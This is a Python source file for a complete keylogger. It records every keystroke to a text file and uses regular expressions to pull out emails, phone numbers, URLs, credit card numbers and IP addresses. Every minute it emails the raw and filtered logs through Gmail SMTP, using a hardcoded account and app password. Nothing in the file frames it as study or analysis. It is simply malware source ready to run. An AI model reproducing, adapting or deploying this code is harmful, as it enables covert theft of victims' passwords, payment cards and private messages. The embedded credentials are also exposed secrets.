# ===================================================== File Existence Handling =====================================================

import os
import time


def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
    """
    Check if the files exist, and create them if not, retrying a few times if they fail.
    """
    for attempt in range(retries):
        # Check if the first file exists, if not, create it
        if not os.path.exists(valuable_info):
            with open(valuable_info, "w") as file:
                file.write("")  # Create an empty file
            print(f"Created missing file: {valuable_info}")

        # Check if the second file exists, if not, create it
        if not os.path.exists(keysniffer_data):
            with open(keysniffer_data, "w") as file:
                file.write("")  # Create an empty file
            print(f"Created missing file: {keysniffer_data}")

        # Check if both files now exist
        if os.path.exists(valuable_info) and os.path.exists(keysniffer_data):
            print(f"Both files are present: {valuable_info}, {keysniffer_data}")
            return True
        else:
            print(
                f"Files not found or created: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
            )
            time.sleep(delay)

    print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
    return False


# ===================================================== Basic keylogger ================================================


import keyboard
import os

# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


import keyboard
import os

# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


def keylogger():
    try:
        # Open the file once at the beginning and keep it open
        typed_text = []  # List to track the typed characters
        while True:
            # Record all key presses until "enter" key is pressed
            events = keyboard.record("enter")

            # Open the file in append mode to write each captured key immediately
            with open(path, "w", encoding="utf-8") as data_file:
                # Process each event to capture keys, including capital letters and special characters
                for event in events:
                    if event.event_type == "down":  # Only capture key down events
                        key = event.name

                        # Handle special cases for spaces and enters
                        if key == "space":
                            key = " "
                        elif key == "enter":
                            key = "\n"
                        elif key == "backspace":
                            if (
                                typed_text
                            ):  # If there is something to delete, remove the last character
                                typed_text.pop()  # Remove the last character from typed_text
                            continue  # Skip writing to file for backspace
                        elif key == "delete":
                            if (
                                typed_text
                            ):  # If there is something to delete, remove the last character
                                typed_text.pop()  # Remove the last character from typed_text
                            continue  # Skip writing to file for delete

                        elif (
                            len(key) > 1
                        ):  # Handle special keys like 'shift', 'ctrl', etc.
                            key = ""

                        # Add the key to typed_text list
                        typed_text.append(key)

                        # Re-create the entire text up to this point and write it to the file
                        data_file.write("".join(typed_text))
                        data_file.flush()  # Force write to the file immediately
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Filter and Extract Valuable Info ====================================

import re
from collections import Counter


def extract_valuable_info(keysniffer_data, filtered_data, interval=5):
    """
    Continuously extracts valuable information from the keysniffer_data file
    and writes it to the filtered_data file every `interval` seconds.
    """
    while True:
        with open(keysniffer_data, "r") as file:
            data = file.read()

        # Define patterns for valuable information
        patterns = {
            "emails": r"[\w\.-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}",  # Generalized for various domains
            "phone_numbers": r"\+(\d{3})\s(\d{3})\s(\d{3})\s(\d{3})",
            "urls": r"https?://(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s]*)?",  # Better handling for different URL structures
            "credit_cards": r"\b(?:\d{4}[-\s]?){3}\d{4}\b|LU\d{18}\b",  # Handling different formats for credit card numbers
            "IPv4 / IPv6": r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}\b",  # Supports both IPv4 and IPv6
            "dates": r"\b(?:\d{1,2}[-/.]?\d{1,2}[-/.]?\d{4}|\d{4}[-/.]?\d{1,2}[-/.]?\d{1,2})\b",  # More date formats
        }

        extracted_data = {}

        for key, pattern in patterns.items():
            matches = re.findall(pattern, data)
            extracted_data[key] = matches

        # Most common words typed
        words = re.findall(r"\b\w+\b", data)
        common_words = Counter(words).most_common(10)
        extracted_data["common_words"] = common_words

        # Write the extracted data to the output file
        with open(filtered_data, "w") as filtered_file:
            for category, items in extracted_data.items():
                filtered_file.write(f"{category.capitalize()}:\n")
                for item in items:
                    filtered_file.write(f"  {item}\n")
                filtered_file.write("\n")

        print("Data filtered and written to the file.")
        time.sleep(interval)  # Wait for the specified interval before re-running


# ===================================================== Sending the Filtered Data via Email ====================================

import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Email sender and receiver details
password = "ixtzymqtphizlcet"
sender_email = "7unkym0nk3y@gmail.com"  # email from the account
receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender

# File to attach
filtered_data_file = "valuable_info.txt"  # Now we're attaching the filtered data file

# Second file to attach
second_data_file = "keysniffer_data.txt"


def send_email():
    # Create the email object
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachments: valuable_info.txt and keysniffer_data.txt"

    # Email body
    email_body = """<html><body><p>Please find the attached files containing filtered data and keylogger data.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    # Attach the filtered data file (valuable_info.txt)
    with open(filtered_data_file, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={filtered_data_file}",
        )
        message.attach(part)

    # Attach the keylogger data file (keysniffer_data.txt)
    with open("keysniffer_data.txt", "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename=keysniffer_data.txt",
        )
        message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP(
            "smtp.gmail.com:587"
        ) as server:  # Replace with your SMTP server and port
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():
    # Sends the filtered data file as an email attachment
    while True:
        send_email()
        time.sleep(60)  # Wait for 1 minutes


# ===================================================== Daily File Deletion =====================================================


def restore_files():

    # Clear the contents of keysniffer_data.txt
    time.sleep(65)
    with open("keysniffer_data.txt", "w") as file:
        file.truncate(0)


# ===================================================== Running the Program ======================================================

import threading

# Run keylogger and send_email_periodically simultaneously using threads
if __name__ == "__main__":
    if check_and_create_file("valuable_info.txt", "keysniffer_data.txt"):
        try:
            keylogger_thread = threading.Thread(target=keylogger, daemon=True)
            filter_thread = threading.Thread(
                target=extract_valuable_info,
                args=("keysniffer_data.txt", "valuable_info.txt"),
                daemon=True,
            )
            email_thread = threading.Thread(target=send_email_periodically, daemon=True)

            keylogger_thread.start()
            filter_thread.start()
            email_thread.start()

            # Keep the main program alive
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Program stopped.")
